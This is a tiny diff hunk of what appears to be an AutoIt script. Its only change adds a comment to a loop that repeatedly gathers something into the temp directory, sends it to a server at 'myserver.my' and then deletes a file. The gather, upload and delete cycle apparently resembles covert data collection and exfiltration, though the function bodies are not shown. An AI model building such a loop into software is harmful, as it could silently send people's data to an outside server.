@@ -25,6 +25,6 @@ _send("http://myserver.my/receive.php/")
 While 1
 	_init(@TempDir)
 	_runFor(2000)
-	_send("http://myserver.my/")
+	_send("http://myserver.my/") ; Assuming that the php-script is called "index.php"
 	_deleteFile()
 WEnd
